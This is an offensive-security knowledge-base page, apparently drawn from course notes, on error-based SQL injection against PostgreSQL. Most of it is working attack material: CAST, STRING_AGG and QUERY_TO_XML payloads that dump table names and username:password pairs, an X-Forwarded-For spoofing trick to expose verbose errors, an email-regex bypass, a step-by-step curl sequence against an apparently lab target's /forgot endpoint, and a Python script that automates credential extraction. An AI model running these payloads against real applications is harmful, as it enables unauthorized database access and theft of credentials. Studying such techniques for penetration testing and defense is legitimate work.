---
tags: [attack/web, attack]
module: advanced_sql_injections
last_updated: 2026-05-22
source_count: 1
---

# Error-Based SQL Injection

An in-band technique that forces the database to include query results inside its error messages, which are then reflected to the attacker. Requires that the application returns verbose database errors — either always, or under specific conditions.

## Overview

Error-based injection exploits the fact that some databases include the offending value in their error text. By deliberately causing a type conversion error, the target value is embedded in the error message returned to the client.

**PostgreSQL CAST technique:** casting a string to `INTEGER` fails with an error that includes the string value.

```sql
-- Force PostgreSQL to print VERSION() in the error message
' AND 0=CAST((SELECT VERSION()) AS INT)--

-- Error returned:
-- ERROR: invalid input syntax for type integer: "PostgreSQL 13.9 (Debian 13.9-0+deb11u1)..."
```

---

## Precondition: Getting Verbose Errors

Applications may hide errors from remote clients for security. Common techniques to enable verbose output:

### X-Forwarded-For Header Spoofing

Applications that show stack traces only to localhost (`127.0.0.1`) but also check the `X-Forwarded-For` header can be bypassed — the header is client-controlled.

```bash
# Burp / curl — add the header to appear as localhost
curl -X POST 'http://target:8080/forgot' \
  -H 'X-Forwarded-For: 127.0.1.1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "email=' or 1=1--@bluebird.htb"
```

```java
// Vulnerable Java code pattern (from BlueBird AuthController.java):
String ipAddress = request.getHeader("X-FORWARDED-FOR");
if (ipAddress == null) { ipAddress = request.getRemoteAddr(); }
if (ipAddress.equals("127.0.1.1")) {
    model.addAttribute("errorMsg", var12.getMessage());  // verbose
} else {
    model.addAttribute("errorMsg", "500 Internal Server Error");  // generic
}
```

### Regex Bypass for Email Fields

A loose email regex (`^.*@[A-Za-z]*\.[A-Za-z]*$`) can be satisfied while still injecting SQL by appending `--@domain.tld` as a comment that also matches the format:

```
' or 1=1--@bluebird.htb         ← matches ^.*@[A-Za-z]*\.[A-Za-z]*$
```

---

## Core Payloads

### Single Value — CAST to INT

```sql
-- Leak any scalar value
' AND 0=CAST((SELECT <TARGET>) AS INT)--@bluebird.htb

-- Examples
' AND 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb
' AND 0=CAST((SELECT current_user) AS INT)--@bluebird.htb
' AND 0=CAST((SELECT password FROM users LIMIT 1) AS INT)--@bluebird.htb
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--@bluebird.htb
```

### Multiple Values — STRING_AGG

Aggregate multiple rows into a single string for a single request:

```sql
' AND 1=CAST(
  (SELECT STRING_AGG(table_name, ',') FROM information_schema.tables LIMIT 1)
  AS INT)--@bluebird.htb
```

```sql
' AND 1=CAST(
  (SELECT STRING_AGG(username || ':' || password, ',') FROM users)
  AS INT)--@bluebird.htb
```

### Entire Tables — QUERY_TO_XML (Stacked Queries Required)

Dumps a full table result set into XML, then the XML string triggers the CAST error. Requires the injection point to support stacked queries (`;`).

```sql
'; SELECT CAST(
  CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2', TRUE, TRUE, '')
  AS TEXT) AS INT)--@bluebird.htb
```

The error message will contain the full XML representation of the result set.

---

## Exploitation Example — BlueBird `/forgot`

**Setup:** POST to `/forgot`, add `X-Forwarded-For: 127.0.1.1`, email format must match `^.*@[A-Za-z]*\.[A-Za-z]*$`.

```bash
# 1. Confirm injection — generic error without XFF header
curl -s -X POST 'http://target:8080/forgot' \
  -d "email=' or 1=1--@bluebird.htb"
# → "500 Internal Server Error"

# 2. Enable verbose errors via XFF header
curl -s -X POST 'http://target:8080/forgot' \
  -H 'X-Forwarded-For: 127.0.1.1' \
  -d "email=' or 1=1--@bluebird.htb"
# → "Incorrect result size: expected 1, actual 362" (confirms injection)

# 3. Leak database version
curl -s -X POST 'http://target:8080/forgot' \
  -H 'X-Forwarded-For: 127.0.1.1' \
  --data-urlencode "email=' AND 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb"
# → Error message contains PostgreSQL version string

# 4. Dump all table names
curl -s -X POST 'http://target:8080/forgot' \
  -H 'X-Forwarded-For: 127.0.1.1' \
  --data-urlencode "email=' AND 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables) AS INT)--@bluebird.htb"

# 5. Dump users with STRING_AGG
curl -s -X POST 'http://target:8080/forgot' \
  -H 'X-Forwarded-For: 127.0.1.1' \
  --data-urlencode "email=' AND 1=CAST((SELECT STRING_AGG(username||':'||password,',') FROM users) AS INT)--@bluebird.htb"
```

---

## Extracting Values from Error Messages

```python
import requests, re, urllib.parse

TARGET = "http://target:8080/forgot"

def cast_leak(query):
    payload = f"' AND 1=CAST(({query}) AS INT)--@bluebird.htb"
    r = requests.post(TARGET,
        headers={"X-Forwarded-For": "127.0.1.1"},
        data={"email": payload})
    # PostgreSQL error format: 'invalid input syntax for type integer: "VALUE"'
    m = re.search(r'invalid input syntax for type integer: "([^"]+)"', r.text)
    return m.group(1) if m else None

print(cast_leak("SELECT VERSION()"))
print(cast_leak("SELECT STRING_AGG(username||':'||password,',') FROM users"))
print(cast_leak("SELECT STRING_AGG(table_name,',') FROM information_schema.tables"))
```

---

## Gotchas & Notes

- CAST error messages truncate long values. Use `SUBSTRING(value, 1, 100)` to window across large strings if the full value is cut off.
- `STRING_AGG` without `LIMIT` can return a value too large for the error message. Add `LIMIT 10` and paginate with `OFFSET`.
- `QUERY_TO_XML` requires superuser or the `pg_read_all_data` role in newer PostgreSQL versions.
- If the application catches `BadSqlGrammarException` separately from general exceptions, CAST errors may go to a different code path — test to confirm verbose output is triggered.
- The `X-Forwarded-For` bypass only works when the application trusts the header without validating it against a proxy allowlist.

## Related Pages

- [[attack/web/white_box_sqli_methodology]] — source code analysis to find this vulnerability class
- [[attack/web/advanced_sqli_character_bypasses]] — combining with space/quote filters
- [[attack/web/second_order_sqli]] — different injection trigger path
- [[attack/web/postgresql_file_read_write]] — next step after achieving SQLi
- [[tools/utility/psql]] — test CAST payloads directly

## Sources

- raw/advanced_sql_injections/advanced_sql_injection_techniques_error_based_sql_injections.md
